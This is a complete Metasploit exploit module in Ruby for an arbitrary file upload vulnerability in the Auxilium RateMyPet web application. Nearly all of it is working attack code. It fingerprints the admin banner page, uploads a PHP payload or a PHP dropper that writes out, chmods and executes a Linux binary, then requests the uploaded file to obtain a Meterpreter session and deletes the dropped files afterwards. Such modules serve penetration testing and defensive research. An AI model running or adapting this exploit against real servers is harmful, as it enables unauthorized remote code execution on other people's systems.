##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Auxilium RateMyPet Arbitrary File Upload Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability found in Auxilium RateMyPet's. The site
				banner uploading feature can be abused to upload an arbitrary file to the web
				server, which is accessible in the 'banner' directory, thus allowing remote code
				execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'DaOne',  #Vulnerability discovery
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '85554'],
					['EDB', '21329']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => ['linux', 'php'],
			'Targets'        =>
				[
				[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
				[ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Sep 14 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The base directory to the application', '/Auxiliumpetratepro/'])
			], self.class)
	end


	def check
		target_uri.path << '/' if target_uri.path[-1,1] != '/'
		base = File.dirname("#{target_uri.path}.")

		res = send_request_raw({'uri'=>"#{base}/admin/sitebanners/upload_banners.php"})
		if res and res.body =~ /\<title\>Pet Rate Admin \- Banner Manager\<\/title\>/
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end
	end


	def get_write_exec_payload(fname, data)
		p = Rex::Text.encode_base64(generate_payload_exe)
		php = %Q|
		<?php
		$f = fopen("#{fname}", "wb");
		fwrite($f, base64_decode("#{p}"));
		fclose($f);
		exec("chmod 777 #{fname}");
		exec("#{fname}");
		?>
		|
		php = php.gsub(/^\t\t/, '').gsub(/\n/, ' ')
		return php
	end


	def on_new_session(cli)
		if cli.type == "meterpreter"
			cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
		end

		@clean_files.each do |f|
			print_status("#{@peer} - Removing: #{f}")
			begin
				if cli.type == 'meterpreter'
					cli.fs.file.rm(f)
				else
					cli.shell_command_token("rm #{f}")
				end
			rescue ::Exception => e
				print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
			end
		end
	end


	def upload_exec(base, php_fname, p)
		data = Rex::MIME::Message.new
		data.add_part('http://', nil, nil, "form-data; name=\"burl\"")
		data.add_part('', nil, nil, "form-data; name=\"alt\"")
		data.add_part(p, 'text/plain', nil, "form-data; name=\"userfile\"; filename=\"#{php_fname}\"")
		data.add_part(' Upload', nil, nil, "form-data; name=\"submitok\"")

		post_data = data.to_s
		post_data = post_data.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

		print_status("#{@peer} - Uploading payload (#{p.length.to_s} bytes)...")
		res = send_request_cgi({
			'method' => 'POST',
			'uri'    => "#{base}/admin/sitebanners/upload_banners.php",
			'ctype'  => "multipart/form-data; boundary=#{data.bound}",
			'data'   => post_data,
		})

		if not res
			print_error("#{@peer} - No response from host")
			return
		end

		print_status("#{@peer} - Requesting '#{php_fname}'...")
		res = send_request_raw({'uri'=>"#{base}/banners/#{php_fname}"})
		if res and res.code == 404
			print_error("#{@peer} - Upload unsuccessful: #{res.code.to_s}")
			return
		end

		handler
	end


	def exploit
		@peer = "#{rhost}:#{rport}"

		target_uri.path << '/' if target_uri.path[-1,1] != '/'
		base = File.dirname("#{target_uri.path}.")

		php_fname =  "#{Rex::Text.rand_text_alpha(5)}.php"
		@clean_files = [php_fname]

		case target['Platform']
		when 'php'
			p = "<?php #{payload.encoded} ?>"
		when 'linux'
			bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
			@clean_files << bin_name
			bin = generate_payload_exe
			p = get_write_exec_payload("/tmp/#{bin_name}", bin)
		end

		upload_exec(base, php_fname, p)
	end
end
